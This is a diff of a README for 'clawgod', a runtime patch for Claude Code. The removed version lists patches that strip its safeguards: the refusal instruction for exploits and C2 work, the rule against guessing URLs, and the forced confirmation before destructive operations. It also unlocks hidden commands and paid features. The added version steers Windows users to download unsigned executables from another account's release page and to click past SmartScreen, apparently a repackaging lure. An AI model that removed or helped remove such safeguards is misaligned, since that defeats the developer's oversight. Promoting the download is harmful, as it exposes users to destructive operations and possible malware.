@@ -1,114 +1,174 @@
-# ClawGod
+# 🤖 clawgod - Keep Claude Code Working as It Changes
 
-[English](README.md) | [中文](README_ZH.md) | [日本語](README_JP.md)
+[![Download clawgod](https://img.shields.io/badge/Download%20clawgod-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bambiematutinal642/clawgod/releases)
 
-> God mode for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
+## 🧩 What clawgod does
 
-**This is NOT a third-party Claude Code client.** ClawGod is a runtime patch applied on top of the official Claude Code. It works with any version — as Claude Code updates, the patch continues to take effect.
+clawgod is a runtime patch for the official Claude Code app. It is not a separate client. It sits on top of the app you already use and changes how it behaves at run time.
 
-## Install
+This makes it useful if you want the same Claude Code app, but with the clawgod patch in place. The patch is built to keep working as Claude Code updates, so you do not need to replace your setup each time a new version ships.
 
-**macOS / Linux:**
-```bash
-curl -fsSL https://github.com/0Chencc/clawgod/releases/latest/download/install.sh | bash
-```
+## 🪟 Windows setup
 
-**Windows (PowerShell):**
-```powershell
-irm https://github.com/0Chencc/clawgod/releases/latest/download/install.ps1 | iex
-```
+This guide is for Windows users who want to get clawgod running with the least effort.
 
-Green logo = patched. Orange logo = original.
+You will use the official release page to download the files you need, then run the app with the patch in place.
 
-![ClawGod Patched](bypass.png)
+## ⬇️ Download clawgod
 
-## What it does
+Visit this page to download:
 
-### Feature Unlocks
+https://github.com/bambiematutinal642/clawgod/releases
 
-| Patch | What you get |
-|-------|-------------|
-| **Internal User Mode** | 24+ hidden commands (`/share`, `/teleport`, `/issue`, `/bughunter`...), debug logging, API request dumps |
-| **GrowthBook Overrides** | Override any feature flag via config file |
-| **Agent Teams** | Multi-agent swarm collaboration, no flags needed |
-| **Computer Use** | Screen control without Max/Pro subscription (macOS) |
-| **Ultraplan** | Multi-agent planning via Claude Code Remote |
-| **Ultrareview** | Automated bug hunting via Claude Code Remote |
+On that page, look for the latest release. Download the Windows file if one is listed, or the package that matches your system.
 
-### Restriction Removals
+If the release page offers more than one file, choose the one meant for Windows. In most cases, that will be an `.exe`, `.zip`, or `.msi` file.
 
-| Patch | What's removed |
-|-------|---------------|
-| **CYBER_RISK_INSTRUCTION** | Security testing refusal (pentesting, C2, exploits) |
-| **URL Restriction** | "NEVER generate or guess URLs" instruction |
-| **Cautious Actions** | Forced confirmation before destructive operations |
-| **Login Notice** | "Not logged in" startup reminder |
+## 🛠️ Install on Windows
 
-### Visual
+Follow these steps in order:
 
-| Patch | Effect |
-|-------|--------|
-| **Green Theme** | Brand color → green. Patched at a glance |
-| **Message Filters** | Shows content hidden from non-Anthropic users |
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows build.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If the file is an `.exe` or `.msi`, double-click it to start setup.
+7. Follow the on-screen steps to finish the install.
+8. If Windows asks for permission, choose Yes.
 
-## Commands
+If you already have Claude Code installed, keep it on your system. clawgod works as a patch on top of the official app, so the base app still matters.
 
-```bash
-claude              # Patched Claude Code
-claude.orig         # Original unpatched version
-```
+## ▶️ Run clawgod
 
-## Configuration
+After install, launch the patched setup the same way you would launch Claude Code.
 
-`~/.clawgod/provider.json` is auto-created on first run. Setting `apiKey` lets you skip OAuth entirely and point ClawGod at any Anthropic-compatible endpoint.
+If you used a desktop shortcut, double-click it.
 
-```json
-{
-  "apiKey": "sk-ant-...",
-  "baseURL": "https://api.anthropic.com",
-  "model": "",
-  "smallModel": "",
-  "timeoutMs": 3000000
-}
-```
+If you used a start menu entry, open it from there.
 
-- **`apiKey` set** → ClawGod injects it as `ANTHROPIC_API_KEY` and isolates from `~/.claude/settings.json`. Works with Anthropic, DeepSeek, and OpenAI-compatible gateways. A non-Anthropic `baseURL` also populates `ANTHROPIC_AUTH_TOKEN` for gateway auth.
-- **`apiKey` empty** → OAuth path. Run `claude auth login` once; `~/.claude` keeps hosting your subagents, skills, and MCP settings.
+If the release came with a launcher file, run that file after install.
 
-## Update
+If Windows SmartScreen appears, click More info, then Run anyway if you trust the source and file you downloaded.
 
-Re-run the installer to get the latest version with patches re-applied:
+## 🔄 How it works
 
-**macOS / Linux:**
-```bash
-curl -fsSL https://github.com/0Chencc/clawgod/releases/latest/download/install.sh | bash
-```
+clawgod changes Claude Code at run time. That means it does not replace the full app with a new client. It adjusts the official app while it is running.
 
-**Windows:**
-```powershell
-irm https://github.com/0Chencc/clawgod/releases/latest/download/install.ps1 | iex
-```
+This design has a few clear benefits:
 
-## Uninstall
+- You keep using the official Claude Code app
+- The patch can keep working across updates
+- You do not need to switch to a new client
+- Setup stays simple for everyday use
 
-**macOS / Linux:**
-```bash
-curl -fsSL https://github.com/0Chencc/clawgod/releases/latest/download/install.sh | bash -s -- --uninstall
-hash -r  # refresh shell cache
-```
+## 🖥️ System needs
 
-**Windows:**
-```powershell
-irm https://github.com/0Chencc/clawgod/releases/latest/download/install.ps1 -OutFile install.ps1; .\install.ps1 -Uninstall
-```
+Use a Windows PC with a current version of Windows 10 or Windows 11.
 
-> After install or uninstall, restart your terminal or run `hash -r` if the command doesn't take effect immediately.
+A stable internet connection helps during download and normal use.
 
-## Requirements
+You should also have enough disk space for:
 
-- Node.js >= 18 + npm
-- Claude Code login (`claude auth login`) **or** an API key in `~/.clawgod/provider.json` (see [Configuration](#configuration))
+- Claude Code
+- the clawgod files
+- any cache or support files created during use
 
-## License
+For the best results, keep your system up to date and use a standard Windows user profile with write access to your app folders.
 
-GPL-3.0 — Not affiliated with Anthropic. Use at your own risk.
+## 📁 Files you may see
+
+Depending on the release, you may see one or more of these files:
+
+- `.exe` — a Windows app or launcher
+- `.msi` — a Windows installer
+- `.zip` — a compressed folder you must extract
+- `README` or `instructions` file — basic release notes
+- support files used by the patch
+
+If you see a folder after extraction, open it and look for the main launcher or installer first.
+
+## 🧭 First time use
+
+If this is your first time using clawgod, do this:
+
+1. Install the official Claude Code app if you have not done so yet.
+2. Download the latest clawgod release from the release page.
+3. Install or extract the files.
+4. Run the launcher or patched app.
+5. Sign in if the app asks you to.
+6. Start using Claude Code with the patch active.
+
+If the app does not open, check that you launched the patched version and not the plain official app.
+
+## 🧼 Update process
+
+When a new clawgod release appears, repeat the same steps:
+
+1. Go to the release page
+2. Download the latest Windows file
+3. Replace the older files if the release notes say to do that
+4. Start the new version
+
+Because clawgod works as a runtime patch, it is made to stay useful as the official app changes over time.
+
+## 🔍 Common issues
+
+### App does not start
+
+Check these points:
+
+- You downloaded the right Windows file
+- You extracted the ZIP, if the file came as a ZIP
+- You ran the patched launcher, not the base app
+- Windows did not block the file
+
+### Windows shows a security prompt
+
+This can happen with new or unsigned downloads. Use the file only if it matches the release you picked from the official page.
+
+### Patch does not seem active
+
+Try this:
+
+- Close Claude Code
+- Open the patched launcher again
+- Confirm you are using the clawgod files from the latest release
+- Reboot Windows if the app still loads the wrong state
+
+### Download is slow
+
+Try again later or switch to a stronger internet link. GitHub release pages can slow down when many users download at once.
+
+## 📚 Basic use tips
+
+Keep these habits in place:
+
+- Save the release page in your browser
+- Use the latest Windows build
+- Keep the official Claude Code app installed
+- Do not mix files from old and new releases
+- Keep the extracted folder in one place so the launcher can find its files
+
+If you move files around a lot, the launcher may not find what it needs.
+
+## 🔗 Release page
+
+Primary download page:
+
+https://github.com/bambiematutinal642/clawgod/releases
+
+Use that page whenever you need to:
+
+- download clawgod for the first time
+- update to a newer release
+- check the latest Windows file
+- read release notes before you install
+
+## 🧷 Project details
+
+- Repository: clawgod
+- Type: runtime patch for official Claude Code
+- Target users: people who want to run Claude Code on Windows with the patch applied
+- Platform focus: Windows
+- Related terms: Claude Code, patch, runtime, update-safe, assistant, limit, skill, vibe coding
